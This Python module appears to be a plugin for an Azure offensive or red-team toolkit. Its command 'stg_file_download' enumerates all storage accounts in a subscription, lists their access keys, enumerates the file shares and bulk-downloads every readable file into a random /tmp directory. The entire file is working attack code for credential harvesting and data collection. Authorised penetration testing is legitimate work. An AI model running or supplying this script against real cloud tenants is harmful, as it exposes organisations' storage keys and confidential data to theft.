import subprocess
import json
import pprint
import hashlib
import random
import os

def start(args):
	storage_order = ['blob', 'dfs', 'file', 'queue', 'table', 'web']

	help_str = "usage:\n\texec stg_file_download ---> scans available storage accounts in subscription for readable files and downloads them"
	
	if(len(args)>0):
		if(args[0][0] == "?"):
			print(help_str)
			return

	print("[+] getting storage accounts in subscription... [+]")
	val = subprocess.run(['az', 'storage', 'account', 'list', '--query', '[].{acct_name:name, resource_group:resourceGroup, storage_types:primaryEndpoints}'], stdout=subprocess.PIPE)
	json_obj = json.loads(val.stdout.decode('utf-8'))


	print("[+] getting the account names [+]")
	print("[+] getting the resource group names [+]")
	print("[+] getting the storage endpoint names [+]\n")
	

	accts = []
	rgroups = []
	tmp_storages = []
	for acct in json_obj:
		accts.append(acct['acct_name'])
		rgroups.append(acct['resource_group'])
		tmp = []
		for stor_type in acct['storage_types']:
			#print(stor_type)
			tmp.append(acct['storage_types'][stor_type])
		tmp_storages.append(tmp)

	storages = []
	for i in range(len(tmp_storages)):
		tmp = []
		for val in tmp_storages[i]:
			if val != None and 'file' in val:
				tmp.append(val)
		storages.append(tmp)


	print("[+] getting the account keys [+]")
	#get account keys
	account_keys = []
	for i in range(len(accts)):
		ret = subprocess.run(['az', 'storage', 'account', 'keys', 'list', '--account-name', accts[i]], stdout=subprocess.PIPE)
		if(ret.returncode != 0):
			print("[-] error: could not list account keys [-]")
			return
		json_obj = json.loads(ret.stdout.decode('utf-8'))
		account_keys.append(json_obj[0]['value'])

	
	print("[+] getting the file shares [+]")
	#get share list
	shares = []
	for i in range(len(accts)):
		ret = subprocess.run(['az', 'storage', 'share', 'list', '--account-name', accts[i], '--account-key', account_keys[i]], stdout=subprocess.PIPE)
		if(ret.returncode != 0):
			print("[-] error: could not list shares [-]")
			return
		json_obj = json.loads(ret.stdout.decode('utf-8'))
		tmp_conts = []
		#tmp_conts.append(rgroups[i])
		for i in range(len(json_obj)):
			tmp_conts.append(json_obj[i]['name'])
		shares.append(tmp_conts)
	

	#download files from share

	#make temp directory
	rand_str = str(random.random())
	hash = hashlib.md5(rand_str.encode())
	file_path = "/tmp/"+hash.hexdigest()
	cmd= "mkdir " + file_path
	os.system(cmd)
	

	print("[+] starting download [+]")
	print("[+] files will be saved to ", file_path, "[+]")

	for i in range(len(accts)):
		for share in shares[i]:
			ret = subprocess.run(['az', 'storage', 'file', 'download-batch', '-d', file_path, '-s', share, '--account-name', accts[i], '--account-key', account_keys[i]], stdout=subprocess.PIPE)
			if(ret.returncode != 0):
				print("[-] error: could not download files [-]")
				return
	print("[+] finished downloading. check directory for files [+]")



